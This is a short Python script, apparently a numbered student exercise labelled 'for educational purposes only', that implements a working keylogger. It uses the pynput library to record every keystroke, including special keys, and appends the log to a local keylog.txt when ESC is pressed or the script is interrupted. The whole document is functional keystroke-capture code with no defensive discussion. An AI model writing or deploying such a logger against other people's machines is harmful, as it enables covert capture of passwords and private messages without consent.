#!/usr/bin/python

# Task 4 : A basic Keylogger [For educational purposes only]

import pynput.keyboard

log = ""

def on_press(key):
    global log
    try:
        log = log + key.char
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "

def write_to_file(log):
    with open("keylog.txt", "a") as f:
        f.write(log)
    print("[+] Log saved !")  # Added log message

def on_release(key):
    if key == pynput.keyboard.Key.esc:  # stop keylogger once ESC is pressed 
        write_to_file(log)
        return False

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        write_to_file(log)
